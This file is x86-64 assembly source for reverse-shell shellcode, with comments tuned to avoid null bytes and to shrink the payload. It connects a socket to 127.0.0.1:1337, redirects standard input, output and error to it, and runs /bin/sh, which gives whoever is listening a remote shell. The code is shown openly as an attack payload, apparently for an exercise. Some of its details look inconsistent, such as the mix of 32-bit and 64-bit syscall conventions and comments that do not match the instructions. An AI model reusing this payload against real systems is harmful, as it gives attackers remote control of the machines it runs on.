section .text
global _start

_start:
    xor rdx, rdx ; clear rax, this results in no 0 bytes in the shellcode
    add al, '0'
    push rax ; push pop instead of mov rcx, rax (shorter)
    pop rcx

_setupipstructforconnect:
    mov rbx, 0x0100007f39050002 ; 127.0.0.1:1337 AF_INET
    push rbx ; use rbx here, because we overwrite it afterwards, so we save a xor to clear it
    push rsp ; push and pop is smaller than mov rsi, rsp
    pop rsi ; point rsi already towards the ip struct for the connection function, this saves us a remove of the ip data later before the execve because we need a 0 byte after bin/sh

_pushzerostostack:
    push rdx ; zero stack so we can use it to clear registers
    loop _pushzerostostack ; loop until rcx is 0

    pop rbx ; clear rbx with our zero data from above
_socket:
    ; we use the bl,cl,dl registers instead of rbx rcx rdx registers because
    ; they result in extra 0 bytes in the shell code
    mov bl, 2 ; AF_INET
    mov cl, 1 ; SOCK_STREAM
    ; mov dl, 6 ; IPPROTO_TCP
    mov ax, 359; sys_socket
    int 0x80 ; syscall
    push rax ; save file descriptor to rdi because connect() expects it there, we can also use rdi in dup2
    pop rdi ; push and pop is smaller than mov rdi, rax

_connect:
    mov al, 42 ; connect
    ; rdi is normally set, but we've already set it in _socket
    ; rsi is normally set, but we've already set it in _setupipstructforconnect
    mov dl, 0x10
    syscall

    pop rcx ; clear rcx with zero data on stack
_dup2:
    push rdi ; push and pop is smaller than mov rbx, rdi ; restore saved filedescriptor
    pop rbx

    mov al, 63 ; dup2
    int 0x80

    inc cl ; increment cl so that it becomes, 1 (stdin) -> 2 (stderr)
    cmp cl, 3; did we reach stderr yet?
    jnz _dup2

_execve:
    pop rsi ; clear rsi
    pop rdx ; clear rdx

    ; prepare execing bin/bash
    mov rbx, `//bin/sh` ; use rbx here, because we don't depend on it afterwards, so we save a xor to clear it
    push rbx
    mov al, 59 ; execve, use al, this results in no 0 bytes in the shellcode

    push rsp ; push and pop is smaller than mov rsi, rsp
    pop rdi

    syscall

_exit:
    mov rax, 1
    mov rbx, 0
    int 0x80